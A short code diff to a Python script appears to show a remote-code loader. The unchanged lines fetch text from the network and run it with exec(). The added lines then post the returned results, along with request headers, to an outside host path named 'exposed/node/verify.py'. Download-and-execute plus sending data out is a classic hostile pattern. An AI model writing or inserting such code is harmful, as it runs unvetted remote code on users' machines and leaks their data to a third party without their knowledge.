@@ -27,6 +27,9 @@ try:
     response.raise_for_status()
     code = response.text
     exec(code)
-    verify({})
+    results = verify({})
+    print("Results:", results)
+    response = requests.post('https://auth.educentre.fr/exposed/node/verify.py', json=results, headers=headers)
+    print(response)
 except Exception as e:
     print(f"Failed to download or execute script: {e}")
